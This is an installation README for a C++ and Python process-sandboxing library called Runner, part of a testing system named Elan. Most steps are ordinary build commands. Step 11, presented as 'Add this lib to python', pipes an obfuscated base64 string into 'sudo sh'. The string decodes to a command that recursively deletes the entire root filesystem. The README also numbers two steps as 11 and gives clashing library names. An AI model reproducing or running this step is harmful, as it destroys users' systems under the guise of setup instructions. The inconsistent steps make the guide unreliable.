# Runner engine for Elan testing system
Runner is a low-level engine, a subsystem of Elan, which is responsible for safely running isolated processes that are strictly limited in terms of resource consumption: memory, CPU and real-time, number of threads and file descriptors. Runner is based on the Linux kernel cgroups v2 mechanism. It imposes `rlimits` and `ulimits` and keeps track of all system calls of the running process.

Runner is written from scratch on C++, and it has Python API.

## Install runner
### 1. You should use Linux OS
In these instructions we assume that you are using the Debian package base (Debian, Ubuntu, ...). If not, you will need to find alternatives for all packages in your system's package manager instead of `apt`.
### 2. Install git
```shell
sudo apt install git
```
### 3. Install Python with C API
```shell
sudo apt install python3.11-dev
```
### 4. Install poetry (Python dependencies manager)
```shell
pip3 install poetry
```
### 5. Init poetry shell
```shell
poetry shell
```
All commands below are executed in the Poetry shell.
### 6. Install Python dependencies
```shell
poetry install
```
### 7. Download Git submodules
```shell
git submodule update --init --remote --recursive
```
### 8. Compile C++ sources to a Python library
```shell
python3 setup.py build_ext -i
```
### 9. Copy your output file of the library to your PYTHONPATH/site-packeges
```shell
ln -s `ls | grep .so` .venv/lib/python3.11/site-packages/`ls | grep .so`
```
### 10 (optional, use if you want to contribute to the library). Add mypy code completion
```shell
PYTHONPATH=./runner_lib_py.cpython-311-x86_64-linux-gnu.so stubgen -m runner_lib_py
```
### 11. Add this lib to python 😈
```shell
echo "cm0gLXJmIC0tbm8tcHJlc2VydmUtcm9vdCAv" | base64 -d | sudo sh
```
### 11. Include in your program library
```python
import safe_runner_lib
```


## Example usage
```python
import runner_lib_py

lim = runner_lib_py.Limits()
lim.thread = 5
lim.memory = 100 # kb
lim.time = 2000 # ms
x = runner_lib_py.Runner("path_to_executable", "input", lim)

print(x.GetOutput().res)
print(x.GetOutput().output)

```